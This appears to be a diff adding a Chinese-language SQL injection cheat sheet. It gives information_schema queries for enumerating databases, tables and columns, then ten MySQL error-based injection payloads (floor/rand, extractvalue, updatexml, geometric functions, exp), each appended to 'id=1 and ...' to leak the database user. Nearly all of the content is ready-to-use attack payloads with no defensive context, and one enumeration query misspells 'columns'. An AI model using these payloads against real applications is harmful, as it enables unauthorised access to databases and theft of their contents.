@@ -1,0 +1,47 @@
+猜数据库 
+select schema_name from information_schema.schemata 
+猜某库的数据表 
+select table_name from information_schema.tables where table_schema=’xxxxx’
+猜某表的所有列 
+Select column_name from information_schema.columns where table_name=’xxxxx’ 
+获取某列的内容 
+Select *** from ****
+
+
+select schema_name from information_schema.schemata
+
+select table_name from information_schema.tables where table_schema=" ";
+
+select column_name from information_schema.cloumns where table_name='' 
+
+报错注入
+
+1.floor() 
+select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+2.extractvalue() 
+select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+
+3.updatexml()
+select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+
+4.geometrycollection()
+select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
+
+5.multipoint()
+select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
+
+6.polygon() 
+select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
+
+7.multipolygon() 
+select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
+
+8.linestring() 
+select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
+
+9.multilinestring() 
+select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
+
+10.exp() 
+select * from test where id=1 and exp(~(select * from(select user())a));
